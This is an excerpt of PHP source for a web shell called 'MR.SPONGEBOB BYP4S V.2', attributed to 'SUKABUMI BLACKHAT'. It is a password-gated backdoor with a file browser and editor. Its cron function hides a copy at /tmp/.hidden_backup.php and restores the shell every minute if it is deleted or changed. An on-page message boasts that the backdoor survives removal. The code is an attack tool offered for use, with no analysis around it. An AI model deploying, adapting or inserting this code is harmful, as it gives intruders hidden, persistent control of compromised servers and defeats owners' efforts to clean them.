...
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['password'])) {
        $passwordHash = '$2a$12$XBwQTd5VTlkFAsoNNgS3H.Gj2LOl0h3wa8jXHdWfs3wh1Ddz2p.1i'; 
...
function add_cronjob_backup() {
    $current_file = realpath($_SERVER['SCRIPT_FILENAME']);
    $backup_path = "/tmp/.hidden_backup.php";
    ...
    $cron_command = "php -r '\$t=\"$current_file\";\$b=\"$backup_path\";if(!file_exists(\$t)||md5_file(\$t)!==md5_file(\$b)){copy(\$b,\$t);}'";
    $new_cronjob = "*/1 * * * * $cron_command > /dev/null 2>&1";

    $current_cron = shell_exec("crontab -l 2>/dev/null");

    if (strpos($current_cron, $cron_command) === false) {
        $current_cron .= $new_cronjob . "\n";
...
if (isset($_POST['auto_cronjob'])) {
    add_cronjob_backup();
    echo "<pre>✅ Crontab aktif! bekdor akan tetap ada walau dihapus atau diganti.</pre>";
}
...
echo "<h2>MR.SPONGEBOB BYP4S V.2</h2>";
...
if (isset($_GET['edit'])) {
    ...
    if (is_file($edit_file)) {
        ...
        echo "<pre>❌ Bukan File bre atau file gk ada</pre><hr>";
    }
}
...
function file_controls($item, $cwd, $is_dir) {
    ...
    $icon = $is_dir ? "📁" : "📄";
    return "<tr><td><a href='?d=" . urlencode($cwd) . ($is_dir ? '&' : '&edit=') . urlencode($item) . "' style='color:white;'>$icon $item</a></td>
...
echo "</table><footer><a href='https://www.sukabumiblackhat.com' target='_blank'>SUKABUMI BLACKHAT x ADIT GANTENG</a></footer></body></html>";
?>
